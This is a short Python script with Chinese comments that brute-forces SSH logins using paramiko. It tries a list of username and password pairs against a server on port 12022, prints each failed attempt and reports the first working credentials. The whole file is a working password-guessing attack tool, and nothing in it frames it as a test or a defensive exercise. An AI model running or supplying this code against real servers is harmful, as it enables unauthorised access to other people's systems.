import paramiko
import socket


# 这个方法用来检查ip地址是否合法
def is_valid_ip(address):
    try:
        socket.inet_aton(address)
        return True
    except:
        return False


# 这个方法用来尝试SSH爆破
def ssh_bruteforce(server, user_pass_pairs):
    for attempt, (username, password) in enumerate(user_pass_pairs, start=1):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            ssh.connect(server, 12022, username=username, password=password)
            print(f">>登录成功，用户名：{username}，密码：{password}")
            return True  # 登录成功，提前返回
        except paramiko.AuthenticationException:
            print(f">>尝试登录第 {attempt} 次，用户名：{username}，密码：{password} - 失败")
        except paramiko.SSHException as e:
            print(f">>连接失败，错误：{e}")
        finally:
            ssh.close()
